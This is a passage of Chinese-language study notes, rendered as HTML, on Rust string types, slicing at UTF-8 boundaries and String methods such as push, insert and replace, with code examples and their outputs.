复合类型：</h3>\n<h4 id=\"字符串与切片\"><a class=\"anchor\" href=\"#字符串与切片\">#</a> 字符串与切片：</h4>\n<h5 id=\"字符串\"><a class=\"anchor\" href=\"#字符串\">#</a> 字符串：</h5>\n<p>&amp;str 是一个不可变引用（字符串字面量）</p>\n<p>String 是可以用来可变引用的</p>\n<h5 id=\"切片\"><a class=\"anchor\" href=\"#切片\">#</a> 切片：</h5>\n<p>对字符串而言，切片就是对 String 类型中某一部分的引用</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> hello <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">..</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">let</span> world <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">..</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>hello 就是从 0 索引开始，到索引 5 之前截止（0-4，不包括）</p>\n<p>world 同理</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202503301922483.png\" alt=\"image-20250330192216268\" /></p>\n<p>切片想要包含 String 最后一个字节：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> len <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">let</span> slice <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">..</span>len<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">let</span> slice <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在对字符串使用切片语法时需要格外小心，切片的索引必须落在字符之间的边界位置，也就是 UTF-8 字符的边界，例如中文在 UTF-8 中占用三个字节，下面的代码就会崩溃：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"中国人\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">..</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>什么是字符串：字符组成的连续集合</p>\n<p><strong>Rust 中的字符是 Unicode 类型，因此每个字符占据 4 个字节内存空间，但是在字符串中不一样，字符串是 UTF-8 编码，也就是字符串中的字符所占的字节数是变化的 (1 - 4) Rust 在语言级别，只有一种字符串类型：  <code>str</code> ，它通常是以引用类型出现  <code>&amp;str</code> ，也就是上文提到的字符串切片。虽然语言级别只有上述的  <code>str</code>  类型，但是在标准库里，还有多种不同用途的字符串类型，其中使用最广的即是  <code>String</code>  类型</strong></p>\n<p><code>str</code>  类型是硬编码进可执行文件，也无法被修改，但是  <code>String</code>  则是一个可增长、可改变且具有所有权的 UTF-8 编码字符串，<strong>当 Rust 用户提到字符串时，往往指的就是  <code>String</code>  类型和  <code>&amp;str</code>  字符串切片类型，这两个类型都是 UTF-8 编码</strong>。</p>\n<p>除了  <code>String</code>  类型的字符串，Rust 的标准库还提供了其他类型的字符串，例如  <code>OsString</code> ，  <code>OsStr</code> ，  <code>CsString</code>  和  <code>CsStr</code>  等，注意到这些名字都以  <code>String</code>  或者  <code>Str</code>  结尾了吗？它们分别对应的是具有所有权和被借用的变量。</p>\n<h5 id=\"string与str的转换\"><a class=\"anchor\" href=\"#string与str的转换\">#</a> String 与 &amp; str 的转换：</h5>\n<p>在之前的代码中，已经见到好几种从  <code>&amp;str</code>  类型生成  <code>String</code>  类型的操作：</p>\n<ul>\n<li><code>String::from(&quot;hello,world&quot;)</code></li>\n<li><code>&quot;hello,world&quot;.to_string()</code></li>\n</ul>\n<p>那么如何将  <code>String</code>  类型转为  <code>&amp;str</code>  类型呢？答案很简单，取引用即可：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello,world!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">say_hello</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">say_hello</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">say_hello</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">as_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">say_hello</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>实际上这种灵活用法是因为  <code>deref</code>  隐式强制转换，具体我们会在 <a href=\"https://course.rs/advance/smart-pointer/deref.html\"> <code>Deref</code>  特征</a>进行详细讲解。</p>\n<h4 id=\"字符串索引\"><a class=\"anchor\" href=\"#字符串索引\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlQUQlOTclRTclQUMlQTYlRTQlQjglQjIlRTclQjQlQTIlRTUlQkMlOTU=\">字符串索引</span></h4>\n<p>在其它语言中，使用索引的方式访问字符串的某个字符或者子串是很正常的行为，但是在 Rust 中就会报错：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> s1 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token keyword\">let</span> h <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>该代码会产生如下错误：</p>\n<pre><code class=\"language-console\">3 |     let h = s1[0];\n  |             ^^^^^ `String` cannot be indexed by `&#123;integer&#125;`\n  |\n  = help: the trait `Index&lt;&#123;integer&#125;&gt;` is not implemented for `String`\n</code></pre>\n<h4 id=\"深入字符串内部\"><a class=\"anchor\" href=\"#深入字符串内部\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTYlQjclQjElRTUlODUlQTUlRTUlQUQlOTclRTclQUMlQTYlRTQlQjglQjIlRTUlODYlODUlRTklODMlQTg=\">深入字符串内部</span></h4>\n<p>字符串的底层的数据存储格式实际上是 [  <code>u8</code>  ]，一个字节数组。对于  <code>let hello = String::from(&quot;Hola&quot;);</code>  这行代码来说， <code>Hola</code>  的长度是  <code>4</code>  个字节，因为  <code>&quot;Hola&quot;</code>  中的每个字母在 UTF-8 编码中仅占用 1 个字节，但是对于下面的代码呢？</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> hello <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"中国人\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>如果问你该字符串多长，你可能会说  <code>3</code> ，但是实际上是  <code>9</code>  个字节的长度，因为大部分常用汉字在 UTF-8 中的长度是  <code>3</code>  个字节，因此这种情况下对  <code>hello</code>  进行索引，访问  <code>&amp;hello[0]</code>  没有任何意义，因为你取不到  <code>中</code>  这个字符，而是取到了这个字符三个字节中的第一个字节，这是一个非常奇怪而且难以理解的返回值。</p>\n<h4 id=\"字符串的不同表现形式\"><a class=\"anchor\" href=\"#字符串的不同表现形式\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlQUQlOTclRTclQUMlQTYlRTQlQjglQjIlRTclOUElODQlRTQlQjglOEQlRTUlOTAlOEMlRTglQTElQTglRTclOEUlQjAlRTUlQkQlQTIlRTUlQkMlOEY=\">字符串的不同表现形式</span></h4>\n<p>现在看一下用梵文写的字符串  <code>“नमस्ते”</code> , 它底层的字节数组如下形式：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">224</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">224</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">174</span><span class=\"token punctuation\">,</span> <span class=\"token number\">224</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">184</span><span class=\"token punctuation\">,</span> <span class=\"token number\">224</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">224</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span> <span class=\"token number\">164</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">224</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165</span><span class=\"token punctuation\">,</span> <span class=\"token number\">135</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>长度是 18 个字节，这也是计算机最终存储该字符串的形式。如果从字符的形式去看，则是：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token char\">'न'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'म'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'स'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'्'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'त'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'े'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>但是这种形式下，第四和六两个字母根本就不存在，没有任何意义，接着再从字母串的形式去看：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">\"न\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"म\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"स्\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ते\"</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>所以，可以看出来 Rust 提供了不同的字符串展现方式，这样程序可以挑选自己想要的方式去使用，而无需去管字符串从人类语言角度看长什么样。</p>\n<p>还有一个原因导致了 Rust 不允许去索引字符串：因为索引操作，我们总是期望它的性能表现是 O (1)，然而对于  <code>String</code>  类型来说，无法保证这一点，因为 Rust 可能需要从 0 开始去遍历字符串来定位合法的字符。</p>\n<h4 id=\"字符串切片\"><a class=\"anchor\" href=\"#字符串切片\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlQUQlOTclRTclQUMlQTYlRTQlQjglQjIlRTUlODglODclRTclODklODc=\">字符串切片</span></h4>\n<p>前文提到过，字符串切片是非常危险的操作，因为切片的索引是通过字节来进行，但是字符串又是 UTF-8 编码，因此你无法保证索引的字节刚好落在字符的边界上，例如：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> hello <span class=\"token operator\">=</span> <span class=\"token string\">\"中国人\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> s <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>hello<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">..</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>运行上面的程序，会直接造成崩溃：</p>\n<pre><code class=\"language-console\">thread 'main' panicked at 'byte index 2 is not a char boundary; it is inside '中' (bytes 0..3) of `中国人`', src/main.rs:4:14\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\n</code></pre>\n<p>这里提示的很清楚，我们索引的字节落在了  <code>中</code>  字符的内部，这种返回没有任何意义。</p>\n<p>因此在通过索引区间来访问字符串时，<strong>需要格外的小心</strong>，一不注意，就会导致你程序的崩溃！</p>\n<h3 id=\"字符串操作\"><a class=\"anchor\" href=\"#字符串操作\">#</a> 字符串操作（***）：</h3>\n<h4 id=\"追加-push\"><a class=\"anchor\" href=\"#追加-push\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTglQkYlQkQlRTUlOEElQTAtcHVzaA==\">追加 (Push)</span></h4>\n<p>在字符串尾部可以使用  <code>push()</code>  方法追加字符  <code>char</code> ，也可以使用  <code>push_str()</code>  方法追加字符串字面量。这两个方法都是<strong>在原有的字符串上追加，并不会返回新的字符串</strong>。由于字符串追加操作要修改原来的字符串，则该字符串必须是可变的，即<strong>字符串变量必须由  <code>mut</code>  关键字修饰</strong>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">push_str</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"追加字符串 push_str() -> &#123;&#125;\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token char\">'!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"追加字符 push() -> &#123;&#125;\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">追加字符串 push_str() -&gt; Hello rust\n追加字符 push() -&gt; Hello rust!\n</code></pre>\n<h4 id=\"插入-insert\"><a class=\"anchor\" href=\"#插入-insert\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTYlOEYlOTIlRTUlODUlQTUtaW5zZXJ0\">插入 (Insert)</span></h4>\n<p>可以使用  <code>insert()</code>  方法插入单个字符  <code>char</code> ，也可以使用  <code>insert_str()</code>  方法插入字符串字面量，与  <code>push()</code>  方法不同，这俩方法需要传入两个参数，第一个参数是字符（串）插入位置的索引，第二个参数是要插入的字符（串），索引从 0 开始计数，如果越界则会发生错误。由于字符串插入操作要<strong>修改原来的字符串</strong>，则该字符串必须是可变的，即<strong>字符串变量必须由  <code>mut</code>  关键字修饰</strong>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello rust!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token char\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"插入字符 insert() -> &#123;&#125;\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token punctuation\">.</span><span class=\"token function\">insert_str</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" I like\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"插入字符串 insert_str() -> &#123;&#125;\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">插入字符 insert() -&gt; Hello, rust!\n插入字符串 insert_str() -&gt; Hello, I like rust!\n</code></pre>\n<h4 id=\"替换-replace\"><a class=\"anchor\" href=\"#替换-replace\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTYlOUIlQkYlRTYlOEQlQTItcmVwbGFjZQ==\">替换 (Replace)</span></h4>\n<p>如果想要把字符串中的某个字符串替换成其它的字符串，那可以使用  <code>replace()</code>  方法。与替换有关的方法有三个。</p>\n<p>1、 <code>replace</code></p>\n<p>该方法可适用于  <code>String</code>  和  <code>&amp;str</code>  类型。 <code>replace()</code>  方法接收两个参数，第一个参数是要被替换的字符串，第二个参数是新的字符串。该方法会替换所有匹配到的字符串。<strong>该方法是返回一个新的字符串，而不是操作原来的字符串</strong>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> string_replace <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I like rust. Learning rust is my favorite!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> new_string_replace <span class=\"token operator\">=</span> string_replace<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"RUST\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>new_string_replace<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">new_string_replace = &quot;I like RUST. Learning RUST is my favorite!&quot;\n</code></pre>\n<p>2、 <code>replacen</code></p>\n<p>该方法可适用于  <code>String</code>  和  <code>&amp;str</code>  类型。 <code>replacen()</code>  方法接收三个参数，前两个参数与  <code>replace()</code>  方法一样，第三个参数则表示替换的个数。<strong>该方法是返回一个新的字符串，而不是操作原来的字符串</strong>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> string_replace <span class=\"token operator\">=</span> <span class=\"token string\">\"I like rust. Learning rust is my favorite!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> new_string_replacen <span class=\"token operator\">=</span> string_replace<span class=\"token punctuation\">.</span><span class=\"token function\">replacen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"RUST\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>new_string_replacen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">new_string_replacen = &quot;I like RUST. Learning rust is my favorite!&quot;\n</code></pre>\n<p>3、 <code>replace_range</code></p>\n<p>该方法仅适用于  <code>String</code>  类型。 <code>replace_range</code>  接收两个参数，第一个参数是要替换字符串的范围（Range），第二个参数是新的字符串。<strong>该方法是直接操作原来的字符串，不会返回新的字符串。该方法需要使用  <code>mut</code>  关键字修饰</strong>。</p>\n<p>示例代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> string_replace_range <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I like rust!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    string_replace_range<span class=\"token punctuation\">.</span><span class=\"token function\">replace_range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">..</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"R\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token macro property\">dbg!</span><span class=\"token punctuation\">(</span>string_replace_range<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>代码运行结果：</p>\n<pre><code class=\"language-console\">string_replace_range = &quot;I like Rust!&quot;\n</code></pre>\n<h4 id=\"删除-delete\"><a class=\"anchor\" href=\"#删除-delete\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3Vyc2UucnMvYmFzaWMvY29tcG91bmQtdHlwZS9zdHJpbmctc2xpY2UuaHRtbCMlRTUlODglQTAlRTklOTklQTQtZGVsZXRl\">删除 (Delete)</span></h4>\n<p>与字符串删除相关的方法有 4 个，它们分别是  <code>pop()</code> ， <code>remove()</code> ， <code>truncate()</code> ， <code>clear()</code> 。这四个方法仅适用于  <code>String</code>  类型。</p>\n<p>1、  <code>pop</code>  —— 删除并返回字符串的最后一个字符</p>\n<p><strong>该方法是直接操作原来的字符串</strong>。但是存在返回值，其返回值是一个  <code>Option</code>  